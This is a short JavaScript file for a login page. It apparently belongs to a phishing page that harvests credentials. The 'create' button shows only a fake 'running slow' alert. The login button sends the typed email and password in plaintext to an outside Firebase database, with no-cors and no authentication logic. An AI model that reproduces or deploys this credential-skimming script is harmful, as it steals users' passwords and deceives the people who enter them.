var elem = document.getElementById("create");
var login = document.getElementById("log");
var email = document.getElementById("fname");
var password = document.getElementById("pname");


elem.addEventListener("click",function(){
  alert("Sorry! We are Running slow.Please try after some time");
})


login.addEventListener("click", function(){
    // fetch('www.mysite.com/enter', email.value, password.value);
    fetch("https://trail-39fca-default-rtdb.firebaseio.com/", {
      method: "POST",
      mode: 'no-cors',
      body: JSON.stringify({
          email: email.value,
          password: password.value
      }),
      headers: {
          "Content-type": "application/json; charset=UTF-8"
      }
    });
})
